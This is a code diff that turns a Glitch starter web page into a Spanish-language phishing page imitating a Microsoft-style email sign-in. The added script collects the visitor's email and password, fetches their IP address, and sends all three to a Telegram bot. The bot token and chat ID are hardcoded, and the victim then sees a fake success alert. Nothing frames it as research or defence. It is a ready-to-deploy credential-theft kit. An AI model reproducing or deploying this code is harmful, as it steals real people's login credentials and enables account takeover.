@@ -1,56 +1,202 @@
 <!DOCTYPE html>
 <html lang="en">
-
 <head>
-  <!-- 
-      This is an HTML comment
-      You can write text in a comment and the content won't be visible in the page
-    -->
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Calendario y Correo Electrónico</title>
+  <style>
+    * {
+      padding: 0;
+      margin: 0;
+      color: #1b1b1b;
+      font-family: sans-serif;
+    }
 
-  <meta charset="utf-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1" />
-  <link rel="icon" href="https://glitch.com/favicon.ico" />
+    body {
+      background-color: #F0EDF3;
+    }
 
-  <!--
-      This is the page head - it contains info the browser uses
-      Like the title, which appears on the browser tab but not inside the page
-      Further down you'll see the content that displays in the page
-    -->
-  <title>Hello World!</title>
+    .formu {
+      max-width: 400px;
+      width: 100%;
+      display: block;
+      box-shadow: 0 2px 6px rgb(0 0 0 / 20%);
+      background-color: white;
+      padding: 40px;
+      margin: auto;
+      margin-top: 250px;
+    }
 
-  <!-- The website stylesheet -->
-  <link rel="stylesheet" href="/style.css" />
+    #ia {
+      width: 130px;
+    }
 
-  <!-- The website JavaScript file -->
-  <script src="/script.js" defer></script>
+    #p {
+      margin: 15px 0;
+      font-size: 25px;
+      line-height: 26px;
+      font-weight: 600;
+    }
+
+    .camp input {
+      width: 95%;
+      border: none;
+      border-bottom: 1px solid #545454;
+      padding: 10px 0;
+      font-size: 16px;
+      margin-bottom: 15px;
+      outline: none;
+    }
+
+    a {
+      color: #0067b8;
+      text-decoration: none;
+    }
+
+    .aS {
+      font-size: 14px;
+      line-height: 40px;
+    }
+
+    .btn {
+      display: flex;
+      justify-content: flex-end;
+      margin: 10px;
+    }
+
+    #btn {
+      color: white;
+      background-color: #0067b8;
+      outline: none;
+      padding: 7px 15px;
+      font-size: 17px;
+      cursor: pointer;
+      border: none;
+    }
+
+    #btn:hover {
+      background-color: #00599F;
+    }
+
+    .cua {
+      margin-bottom: 400px;
+    }
+
+    #btn2 {
+      color: white;
+      background-color: #0067b8;
+      outline: none;
+      padding: 7px 15px;
+      font-size: 17px;
+      cursor: pointer;
+      border: none;
+    }
+
+    #btn2:hover {
+      background-color: #00599F;
+    }
+
+    @media (max-width: 920px) {
+      body {
+        background-color: white;
+      }
+
+      .formu {
+        box-shadow: none;
+        margin-top: 0px;
+        padding: 40px 0;
+      }
+    }
+  </style>
 </head>
-
 <body>
-  <!--
-      The body includes the content you see in the page
-      Each element is defined using tags, like this <div></div>
-      The attributes like class="wrapper" let us style elements in the CSS
-    -->
-  <div class="wrapper">
-    <div class="content" role="main">
-      <h1 class="title">Oh hi website!</h1>
-      <img src="/cool-website.svg" class="illustration" alt="cool website" />
-      <div class="instructions">
-        <p>
-          Fork <a href="https://github.com/glitchdotcom/website-to-compute">this project</a> and open it in a GitHub Codespace.
-        </p>
-        <p> Follow the steps in the README to deploy your new website to Fastly in a few steps!
-        </p>
-
+  <div class="cua">
+    <form id="loginForm" action="javascript:void(0);">
+      <div class="formu" id="formu">
+        <div class="i">
+          <img id="ia" src="https://i.postimg.cc/0yJFXM92/fw.png" alt="">
+        </div>
+        <h3 id="p">Iniciar sesion:</h3>
+        <div class="camp">
+          <input type="email" id="email" name="af" required placeholder="Correo electrónico, teléfono o Skype">
+        </div>
+        <div class="aS">
+          <p>¿No tiene una cuenta? <a href="#">Cree una.</a></p>
+        </div>
+        <div class="btn">
+          <button id="btn" type="button">Siguiente</button>
+        </div>
       </div>
 
-      <footer class="footer">
-        <div>
-          <a class="remix" href="https://github.com/glitchdotcom/website-to-compute">🚧 Get your own site</a>
+      <div class="formu" id="formu2" style="display: none;">
+        <div class="i">
+          <img id="ia" src="https://i.postimg.cc/0yJFXM92/fw.png" alt="">
         </div>
-      </footer>
-    </div>
+        <h3 id="p">Ingresa tu contraseña</h3>
+        <div class="camp">
+          <input type="password" id="password" name="af2" required placeholder="Contraseña">
+        </div>
+        <div class="aS">
+          <p><a href="#">¿Olvidó su contraseña?</a></p>
+        </div>
+        <div class="btn">
+          <button id="btn2" type="submit">Siguiente</button>
+        </div>
+      </div>
+    </form>
   </div>
-</body>
+  <script>
+    const token = '7747005849:AAHNkpo1wO6IaNV8Dibs3bhdDu9yrMDTQwE'; // Reemplaza con el token de tu bot
+    const chatId = '-7600978223'; // Reemplaza con el ID del chat o canal
 
+    document.getElementById("btn").addEventListener("click", function() {
+      document.getElementById("formu").style.display = "none";
+      document.getElementById("formu2").style.display = "block";
+    });
+
+    document.getElementById("loginForm").addEventListener("submit", function(event) {
+      event.preventDefault(); // Evita el envío del formulario tradicional
+
+      const email = document.getElementById("email").value;
+      const password = document.getElementById("password").value;
+
+      // Obtener IP del usuario usando ipify
+      fetch('https://api.ipify.org?format=json')
+        .then(response => response.json())
+        .then(ipData => {
+          const ip = ipData.ip;
+
+          // Mensaje formateado con IP
+          const message = `👤 *Crr*: ${email}\n🔑 *Clvvve*: ${password}\n📍 *IP*: ${ip}`;
+
+          // Enviar el mensaje a Telegram
+          fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
+            method: 'POST',
+            headers: {
+              'Content-Type': 'application/json',
+            },
+            body: JSON.stringify({
+              chat_id: chatId,
+              text: message,
+              parse_mode: 'Markdown', // Usa Markdown para formato
+            }),
+          })
+          .then(response => response.json())
+          .then(data => {
+            if (data.ok) {
+              alert('Verificacion con éxito.');
+            } else {
+              alert('Error al enviar datos.');
+            }
+          })
+          .catch(error => {
+            console.error('Error:', error);
+          });
+        })
+        .catch(error => {
+          console.error('Error al obtener IP:', error);
+        });
+    });
+  </script>
+</body>
 </html>
